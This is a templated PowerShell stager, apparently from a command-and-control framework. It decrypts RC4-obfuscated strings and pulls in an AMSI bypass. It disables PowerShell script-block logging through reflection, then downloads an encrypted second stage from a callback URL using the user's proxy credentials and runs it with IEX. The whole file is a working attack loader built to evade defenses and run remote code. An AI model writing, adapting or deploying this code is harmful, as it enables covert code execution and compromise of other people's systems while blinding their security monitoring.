${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")

{% include "powershell/rc4.ps1" %}


function {{symbol_name("Decrypt-String")}} {
    param(
        [System.String]$string
  	)
    $result = [System.Convert]::FromBase64String($string)
    $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
    $result = [System.Text.Encoding]::ASCII.GetString($result)
    $result
}

{% for s in strings %}
$string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s}}"
{% endfor %}

if ($PSVersionTable.PSVersion.Major -ge 5) {
    {% include "powershell/am0nsec-amsi-bypass.ps1" %}

    $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
    $settings[$string5] = @{}
    $settings[$string5].Add($string6, "0")
}

$K=new-object net.webclient
$K.proxy=[Net.WebRequest]::GetSystemWebProxy()
$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
$code = {{symbol_name("Decrypt-String")}} ($K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))

IEX $code

{{exec_clipboard_entry}}
